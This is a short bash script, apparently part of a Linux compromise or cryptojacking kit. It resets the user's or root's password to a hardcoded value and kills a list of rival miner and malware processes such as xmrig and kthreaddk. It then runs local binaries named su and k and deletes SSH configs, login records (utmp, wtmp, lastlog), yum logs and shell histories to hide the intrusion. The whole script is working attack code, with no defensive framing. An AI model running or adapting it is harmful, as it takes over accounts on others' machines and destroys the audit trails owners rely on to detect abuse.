#!/bin/bash

my_uid=$(echo $UID)
current=$1
pass="il0v3an1m3000omg221hololivethebest"

if [[ $my_uid > 0 ]]; then
    echo -e "$current\n$pass\n$pass" | passwd
else
    echo -e "$pass\n$pass" | passwd
fi

tnt=("krn" "kthreaddk" "cosynus" "python" "python3" "ip" ".dhpcd" "syste3md" "xmrig" 'zzh' "screen" "boner" "perl" "dropbear")
for i in ${tnt[@]}; do
    killall $i
    pkill -f $i
    pkill -9 $i
    /bin/busybox killall $i
    /bin/busybox pkill -f $i
    /bin/busybox pkill -9 $i
done

./su
./k

rm -rf k
rm -rf s.x
rm -rf r
rm -rf ../ssh
rm -rf ../ssh*
rm -rf /tmp/ssh*
rm -rf /tmp/.ssh/config*
rm -rf /tmp/.ssh/krane*
rm -rf /var/run/utmp
rm -rf /var/run/wtmp -
rm -rf /var/log/lastlog
rm -rf /usr/adm/lastlog
rm -rf .bash_history
cd /home
rm -rf yum.log
cd /root
rm -rf .bash_history
touch .bash_history